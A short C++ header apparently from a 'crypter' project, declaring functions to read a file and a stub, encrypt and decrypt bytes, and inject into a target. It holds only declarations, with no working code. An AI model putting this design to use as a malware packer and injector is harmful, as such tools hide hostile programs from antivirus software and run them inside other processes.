/**
 * loader.hpp
 */

#ifndef CRYPTER_LOADER_H
#define CRYPTER_LOADER_H

#include <string>

#define KEY_SIZE 1024

typedef struct loader {
    char *key;
    char *bytes;
    size_t size;
} loader_t;

int loader_read_file(loader_t *loader, const std::string &filename);
int loader_write_file(loader_t *loader, const std::string &filename);
int loader_read_stub(loader_t *loader, const std::string &filename);
int loader_write_stub(loader_t *loader, const std::string &filename);
void loader_encrypt(loader_t *loader);
void loader_decrypt(loader_t *loader);
int loader_inject(loader_t *loader, const std::string &target);
void loader_free(loader_t *loader);

#endif /* CRYPTER_LOADER_H */